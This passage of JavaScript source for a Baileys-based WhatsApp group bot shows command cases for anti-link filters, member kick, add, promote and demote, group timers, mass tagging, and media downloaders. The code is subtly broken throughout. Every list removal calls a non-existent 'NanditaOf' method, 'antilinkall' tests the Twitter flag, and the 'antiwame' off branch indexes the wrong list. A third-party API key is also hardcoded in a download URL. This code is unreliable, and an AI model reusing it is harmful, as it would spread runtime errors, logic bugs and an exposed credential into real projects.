if (!m.isGroup) return replygcdeepak(mess.group)
if (!isBotAdmins) return replygcdeepak(mess.botAdmin)
if (!isAdmins && !DeepakTheCreator) return replygcdeepak(mess.admin)
if (args[0] === "on") {
if (AntiNsfw) return replygcdeepak('Already activated')
ntnsfw.push(from)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
replygcdeepak('Success in turning on nsfw in this group')
var groupe = await DeepakBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
DeepakBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNsfw(not safe for work) feature has been enabled in this group, which means one can access sexual graphics from the bot!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfw) return replygcdeepak('Already deactivated')
let off = ntnsfw.NanditaOf(from)
ntnsfw.splice(off, 1)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
replygcdeepak('Success in turning off nsfw in this group')
} else {
  await replygcdeepak(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
  case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
if (!m.isGroup) return replygcdeepak(mess.group)
if (!isBotAdmins) return replygcdeepak(mess.botAdmin)
if (!isAdmins && !DeepakTheCreator) return replygcdeepak(mess.admin)
if (args[0] === "on") {
if (AntiLinkYoutubeVid) return replygcdeepak('Already activated')
ntilinkytvid.push(from)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
replygcdeepak('Success in turning on youtube video antilink in this group')
var groupe = await DeepakBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
DeepakBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube video link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeVid) return replygcdeepak('Already deactivated')
let off = ntilinkytvid.NanditaOf(from)
ntilinkytvid.splice(off, 1)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
replygcdeepak('Success in turning off youtube video antilink in this group')
} else {
  await replygcdeepak(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
    case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
if (!m.isGroup) return replygcdeepak(mess.group)
if (!isBotAdmins) return replygcdeepak(mess.botAdmin)
if (!isAdmins && !DeepakTheCreator) return replygcdeepak(mess.admin)
if (args[0] === "on") {
if (AntiLinkYoutubeChannel) return replygcdeepak('Already activated')
ntilinkytch.push(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
replygcdeepak('Success in turning on youtube channel antilink in this group')
var groupe = await DeepakBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
DeepakBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube channel link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeChannel) return replygcdeepak('Already deactivated')
let off = ntilinkytch.NanditaOf(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
ntilinkytch.splice(off, 1)
replygcdeepak('Success in turning off youtube channel antilink in this group')
} else {
  await replygcdeepak(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
      case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
if (!m.isGroup) return replygcdeepak(mess.group)
if (!isBotAdmins) return replygcdeepak(mess.botAdmin)
if (!isAdmins && !DeepakTheCreator) return replygcdeepak(mess.admin)
if (args[0] === "on") {
if (AntiLinkInstagram) return replygcdeepak('Already activated')
ntilinkig.push(from)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
replygcdeepak('Success in turning on instagram antilink in this group')
var groupe = await DeepakBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
DeepakBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the instagram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkInstagram) return replygcdeepak('Already deactivated')
let off = ntilinkig.NanditaOf(from)
ntilinkig.splice(off, 1)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
replygcdeepak('Success in turning off instagram antilink in this group')
} else {
  await replygcdeepak(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
        case 'antilinkfacebook': case 'antilinkfb': {
if (!m.isGroup) return replygcdeepak(mess.group)
if (!isBotAdmins) return replygcdeepak(mess.botAdmin)
if (!isAdmins && !DeepakTheCreator) return replygcdeepak(mess.admin)
if (args[0] === "on") {
if (AntiLinkFacebook) return replygcdeepak('Already activated')
ntilinkfb.push(from)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
replygcdeepak('Success in turning on facebook antilink in this group')
var groupe = await DeepakBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
DeepakBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the facebook link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return replygcdeepak('Already deactivated')
let off = ntilinkfb.NanditaOf(from)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
replygcdeepak('Success in turning off facebook antilink in this group')
} else {
  await replygcdeepak(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
          case 'antilinktelegram': case 'antilinktg': {
if (!m.isGroup) return replygcdeepak(mess.group)
if (!isBotAdmins) return replygcdeepak(mess.botAdmin)
if (!isAdmins && !DeepakTheCreator) return replygcdeepak(mess.admin)
if (args[0] === "on") {
if (AntiLinkTelegram) return replygcdeepak('Already activated')
ntilinktg.push(from)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
replygcdeepak('Success in turning on telegram antilink in this group')
var groupe = await DeepakBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
DeepakBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the telegram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTelegram) return replygcdeepak('Already deactivated')
let off = ntilinktg.NanditaOf(from)
ntilinktg.splice(off, 1)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
replygcdeepak('Success in turning off telegram antilink in this group')
} else {
  await replygcdeepak(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
            case 'antilinktiktok': case 'antilinktt': {
if (!m.isGroup) return replygcdeepak(mess.group)
if (!isBotAdmins) return replygcdeepak(mess.botAdmin)
if (!isAdmins && !DeepakTheCreator) return replygcdeepak(mess.admin)
if (args[0] === "on") {
if (AntiLinkTiktok) return replygcdeepak('Already activated')
ntilinktt.push(from)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
replygcdeepak('Success in turning on tiktok antilink in this group')
var groupe = await DeepakBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
DeepakBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the tiktok link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTiktok) return replygcdeepak('Already deactivated')
let off = ntilinktt.NanditaOf(from)
ntilinktt.splice(off, 1)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
replygcdeepak('Success in turning off tiktok antilink in this group')
} else {
  await replygcdeepak(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
            case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
if (!m.isGroup) return replygcdeepak(mess.group)
if (!isBotAdmins) return replygcdeepak(mess.botAdmin)
if (!isAdmins && !DeepakTheCreator) return replygcdeepak(mess.admin)
if (args[0] === "on") {
if (AntiLinkTwitter) return replygcdeepak('Already activated')
ntilinktwt.push(from)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
replygcdeepak('Success in turning on twitter antilink in this group')
var groupe = await DeepakBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
DeepakBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the twitter link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTwitter) return replygcdeepak('Already deactivated')
let off = ntilinktwt.NanditaOf(from)
ntilinktwt.splice(off, 1)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
replygcdeepak('Success in turning off twitter antilink in this group')
} else {
  await replygcdeepak(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
              case 'antilinkall': {
if (!m.isGroup) return replygcdeepak(mess.group)
if (!isBotAdmins) return replygcdeepak(mess.botAdmin)
if (!isAdmins && !DeepakTheCreator) return replygcdeepak(mess.admin)
if (args[0] === "on") {
if (AntiLinkTwitter) return replygcdeepak('Already activated')
ntilinkall.push(from)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
replygcdeepak('Success in turning on all antilink in this group')
var groupe = await DeepakBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
DeepakBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send any link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return replygcdeepak('Already deactivated')
let off = ntilinkall.NanditaOf(from)
ntilinkall.splice(off, 1)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
replygcdeepak('Success in turning off all antilink in this group')
} else {
  await replygcdeepak(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antitoxic': {
if (!m.isGroup) return replygcdeepak(mess.group)
if (!isBotAdmins) return replygcdeepak(mess.botAdmin)
if (!isAdmins && !DeepakTheCreator) return replygcdeepak(mess.admin)
if (args[0] === "on") {
if (antiToxic) return replygcdeepak('Already activated')
nttoxic.push(from)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
replygcdeepak('Success in turning on antitoxic in this group')
var groupe = await DeepakBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
DeepakBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to use bad words in this group, one who uses will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiToxic) return replygcdeepak('Already deactivated')
let off = nttoxic.NanditaOf(from)
nttoxic.splice(off, 1)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
replygcdeepak('Success in turning off antitoxic in this group')
} else {
  await replygcdeepak(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antiwame': {
if (!m.isGroup) return replygcdeepak(mess.group)
if (!isBotAdmins) return replygcdeepak(mess.botAdmin)
if (!isAdmins && !DeepakTheCreator) return replygcdeepak(mess.admin)
if (args[0] === "on") {
if (antiWame) return replygcdeepak('Already activated')
ntwame.push(from)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
replygcdeepak('Success in turning on antiwame in this group')
var groupe = await DeepakBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
DeepakBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send wa.me in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiWame) return replygcdeepak('Already deactivated')
let off = nttoxic.NanditaOf(from)
ntwame.splice(off, 1)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
replygcdeepak('Success in turning off antiwame in this group')
} else {
  await replygcdeepak(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antilinkgc': {
if (!m.isGroup) return replygcdeepak(mess.group)
if (!isBotAdmins) return replygcdeepak(mess.botAdmin)
if (!isAdmins && !DeepakTheCreator) return replygcdeepak(mess.admin)
if (args[0] === "on") {
if (Antilinkgc) return replygcdeepak('Already activated')
ntlinkgc.push(from)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
replygcdeepak('Success in turning on antiwame in this group')
var groupe = await DeepakBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
DeepakBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!Antilinkgc) return replygcdeepak('Already deactivated')
let off = ntlinkgc.NanditaOf(from)
ntlinkgc.splice(off, 1)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
replygcdeepak('Success in turning off antiwame in this group')
} else {
await replygcdeepak(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
   case 'leavegc': {
                if (!DeepakTheCreator) return replygcdeepak(mess.owner)
                await DeepakBotInc.groupLeave(m.chat).then((res) => replygcdeepak(jsonformat(res))).catch((err) => replygcdeepak(jsonformat(err)))
            }
            break
case 'add': {
if (!m.isGroup) return replygcdeepak(mess.group)
if (!isAdmins && !DeepakTheCreator) return replygcdeepak(mess.admin)
if (!isBotAdmins) return replygcdeepak(mess.botAdmin)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await DeepakBotInc.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => replygcdeepak(jsonformat(res))).catch((err) => replygcdeepak(jsonformat(err)))
}
break
case 'closetime': {
if (!m.isGroup) return replygcdeepak(mess.group)
if (!isAdmins && !DeepakTheCreator) return replygcdeepak(mess.admin)
if (!isBotAdmins) return replygcdeepak(mess.botAdmin)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replygcdeepak('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
replygcdeepak(`Close Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const close = `*On time* Group Closed By Admin\nNow Only Admins Can Send Messages`
DeepakBotInc.groupSettingUpdate(from, 'announcement')
replygcdeepak(close)
}, timer)
}
break
           case 'ephemeral': {
                if (!m.isGroup) return replygcdeepak(mess.group)
                if (!isBotAdmins) return replygcdeepak(mess.botAdmin)
                if (!isAdmins) return replygcdeepak(mess.admin)
                if (!text) return replygcdeepak('Enter the value enable/disable')
                if (args[0] === 'enable') {
                    await DeepakBotInc.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => replygcdeepak(jsonformat(res))).catch((err) => replygcdeepak(jsonformat(err)))
                } else if (args[0] === 'disable') {
                    await DeepakBotInc.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => replygcdeepak(jsonformat(res))).catch((err) => replygcdeepak(jsonformat(err)))
                }
            }
            break
            case 'delete': case 'del': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) return replygcdeepak('The message was not sent by a bot!')
                 DeepakBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'linkgroup': case 'linkgc': case 'gclink': case 'grouplink': {
                if (!m.isGroup) return replygcdeepak(mess.group)
                if (!isBotAdmins) return replygcdeepak(mess.botAdmin)
                let response = await DeepakBotInc.groupInviteCode(m.chat)
                DeepakBotInc.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup Link : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
case 'opentime': {
if (!m.isGroup) return replygcdeepak(mess.group)
if (!isAdmins && !DeepakTheCreator) return replygcdeepak(mess.admin)
if (!isBotAdmins) return replygcdeepak(mess.botAdmin)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replygcdeepak('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
replygcdeepak(`Open Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const open = `*On time* Group Opened By Admin\n Now Members Can Send Messages`
DeepakBotInc.groupSettingUpdate(from, 'not_announcement')
replygcdeepak(open)
}, timer)
}
break
case 'kick': {
if (!m.isGroup) return replygcdeepak(mess.group)
if (!isAdmins && !DeepakTheCreator) return replygcdeepak(mess.admin)
if (!isBotAdmins) return replygcdeepak(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await DeepakBotInc.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => replygcdeepak(jsonformat(res))).catch((err) => replygcdeepak(jsonformat(err)))
}
break
    case 'setname': case 'setsubject': {
                if (!m.isGroup) return replygcdeepak(mess.group)
                if (!isBotAdmins) return replygcdeepak(mess.botAdmin)
                if (!isAdmins) return replygcdeepak(mess.admin)
                if (!text) return replygcdeepak('Text ?')
                await DeepakBotInc.groupUpdateSubject(m.chat, text).then((res) => replygcdeepak(mess.success)).catch((err) => replygcdeepak(jsonformat(err)))
            }
            break
          case 'setdesc': case 'setdesk': {
                if (!m.isGroup) return replygcdeepak(mess.group)
                if (!isBotAdmins) return replygcdeepak(mess.botAdmin)
                if (!isAdmins) return replygcdeepak(mess.admin)
                if (!text) return replygcdeepak('Text ?')
                await DeepakBotInc.groupUpdateDescription(m.chat, text).then((res) => replygcdeepak(mess.success)).catch((err) => replygcdeepak(jsonformat(err)))
            }
            break
case 'setppgroup': case 'setgcpp': case 'setgrouppp': {
if (!m.isGroup) return replygcdeepak(mess.group)
if (!isAdmins && !DeepakTheCreator) return replygcdeepak(mess.admin)
if (!isBotAdmins) return replygcdeepak(mess.botAdmin)
if (!quoted) return replygcdeepak(`Where is the picture?`)
if (!/image/.test(mime)) return replygcdeepak(`Send/Reply Image With Caption ${prefix + command}`)
if (/webp/.test(mime)) return replygcdeepak(`Send/Reply Image With Caption ${prefix + command}`)
var mediz = await DeepakBotInc.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `/panjang`) {
var { img } = await generateProfilePicture(mediz)
await DeepakBotInc.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
replygcdeepak(`Success`)
} else {
var memeg = await DeepakBotInc.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
replygcdeepak(`Success`)
}
}
break
case 'promote': {
if (!m.isGroup) return replygcdeepak(mess.group)
if (!isAdmins && !DeepakTheCreator) return replygcdeepak(mess.admin)
if (!isBotAdmins) return replygcdeepak(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await DeepakBotInc.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => replygcdeepak(jsonformat(res))).catch((err) => replygcdeepak(jsonformat(err)))
}
break
case 'demote': {
if (!m.isGroup) return replygcdeepak(mess.group)
if (!isAdmins && !DeepakTheCreator) return replygcdeepak(mess.admin)
if (!isBotAdmins) return replygcdeepak(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await DeepakBotInc.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => replygcdeepak(jsonformat(res))).catch((err) => replygcdeepak(jsonformat(err)))
}
break
case 'hidetag': {
if (!m.isGroup) return replygcdeepak(mess.group)
if (!isAdmins && !DeepakTheCreator) return replygcdeepak(mess.admin)
if (!isBotAdmins) return replygcdeepak(mess.botAdmin)
DeepakBotInc.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case 'tagall': {
if (!m.isGroup) return replygcdeepak(mess.group)
if (!isAdmins && !DeepakTheCreator) return replygcdeepak(mess.admin)
if (!isBotAdmins) return replygcdeepak(mess.botAdmin)
me = m.sender
let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝ 
 
 😶 *Tagger :*  @${me.split('@')[0]}
 🌿 *Message : ${q ? q : 'no message'}*\n\n`
for (let mem of participants) {
teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
}
DeepakBotInc.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case 'ebinary': {
if (!q) return replygcdeepak(`Send/reply text with captions ${prefix + command}`)
replygcdeepak(mess.wait)
let { eBinary } = require('./scrape/binary')
let eb = await eBinary(`${q}`)
replygcdeepak(eb)
}
break
case 'dbinary': {
if (!q) return replygcdeepak(`Send/reply text with captions ${prefix + command}`)
replygcdeepak(mess.wait)
let { dBinary } = require('./scrape/binary')
let db = await dBinary(`${q}`)
replygcdeepak(db)
}
break
case 'fbdl': case 'facebook': {
if (!q) return replygcdeepak(`Where's the link??`)
let anu = await fetchJson(`https://xeonapi.onrender.com/api/dowloader/fbdown?url=${q}&apikey=a565ddca`)
DeepakBotInc.sendMessage(m.chat, { video: { url: anu.result.HD }, caption: 'Here you go!.'}, {quoted: m})
}
break
case 'tiktok':{ 
if (!text) return replygcdeepak( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return replygcdeepak(`Link Invalid!!`)
replygcdeepak(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
DeepakBotInc.sendMessage(m.chat, { caption: `Here you go!`, video: { url: data.watermark }}, {quoted:m})
})
}
break
case 'tiktokaudio':{
if (!text) return replygcdeepak( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return replygcdeepak(`Link Invalid!!`)
replygcdeepak(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
DeepakBotInc.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
case 'mediafire':
if (!q) return replygcdeepak(`Where is the link?`)
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return replygcdeepak('The link you sent is not a mediafire link or the link is invalid!')
replygcdeepak(mess.wait)
let medfr = await scp1.mediafire(q)
await DeepakBotInc.sendMessage(from, {document:{url:medfr.link},jpegThumbnail : defaultpp, fileName:`Downloaded By ${m.pushName}.${medfr.mime}`, mimetype:`application/${mime}`},{quoted:m})
break
case 'google': {
if (!q) return replygcdeepak(`Example : ${prefix + command} ${botname}`)
replygcdeepak(mess.wait)
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
replygcdeepak(teks)
})
}
break
case 'happymod':{
if (!q) return replygcdeepak(`Example ${prefix+command} Sufway surfer mod`)
replygcdeepak(mess.wait)
let kat = await scp1.happymod(q)
replygcdeepak(util.format(kat))
}
break
case 'recipe':{
if (!q) return replygcdeepak(`Example ${prefix+command} samosa`)
replygcdeepak(mess.wait)
let ker = await scp1.cariresep(q)
replygcdeepak(util.format(ker))
}
break
case 'readrecipe':{
if (!q) return replygcdeepak(`Example ${prefix+command} https://resepkoki.id/resep/resep-ayam-geprek-keju/`)
replygcdeepak(mess.wait)
let rain = await scp1.bacaresep(q)
let dty = `Recipe Below
Title : ${rain.judul_nya}
Time : ${rain.waktu_nya}
Result : ${rain.hasil_nya}
Degree of difficulty : ${rain.tingkat_kesulitan}
Material :
${rain.bahan_nya}`
DeepakBotInc.sendMessage(m.chat,{
image:{
url:rain.thumb_nya},
caption:dty,
jpegThumbnail: defaultpp},
{quoted:m})
}
break
case 'search':
case 'yts': case 'ytsearch': {
                if (!text) return replygcdeepak(`Example : ${prefix + command} story wa anime`)
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`
                }
                DeepakBotInc.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
case 'xxxxplay':{
if (!text) return replygcdeepak(`Example : ${prefix+command} story wa anime`)
replygcdeepak(mess.wait)
let search = await yts(text)
url = search.videos[0].url
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
eek = await getBuffer(anu.thumbnail)
owned = `${ownernumber}@s.whatsapp.net`
ngen = `
Title : ${anu.title}
Ext : Search
ID : ${anu.videoId}
Viewers : ${anu.views}
Upload At : ${anu.ago}
Author : ${anu.author.name}
Channel : ${anu.author.url}
Link : ${anu.url}

Copy the link above and type the .ytmp3 link for audio and the .ytmp4 link for video`
DeepakBotInc.sendMessage(m.chat, { image : eek, caption: ngen }, { quoted: m})
}
break
case 'play':  case 'song': case 'ytmp3': {
if (!text) return replygcdeepak(`Example : ${prefix + command} anime whatsapp status`)
const deepakplaymp3 = require('./lib/ytdl2')
const { fetchBuffer } = require("./lib/myfunc2")
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await deepakplaymp3.mp3(anup3k.url)
await DeepakBotInc.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:m})
await fs.unlinkSync(pl.path)
}
break
case 'ytmp4': case 'ytvideo': {
const deepakvidoh = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !deepakvidoh.isYTUrl(text)) replygcdeepak(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
const vid=await deepakvidoh.mp4(text)
const ytc=`
*${themeemoji}Tittle:* ${vid.title}
*${themeemoji}Date:* ${vid.date}
*${themeemoji}Duration:* ${vid.duration}
*${themeemoji}Quality:* ${vid.quality}`
await DeepakBotInc.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
}
break
case 'ytvxxx': case 'ytmp4xxx': case 'mp4xxx':{
if (!text) return replygcdeepak('Enter the link!!!')
replygcdeepak(mess.wait)
downloadMp4(text)
}
break
case 'ytaxxx': case 'ytmp3xxx': case 'mp3xxx':{
if (!text) return replygcdeepak('Enter the link!!!')
replygcdeepak(mess.wait)
downloadMp3(text)
}
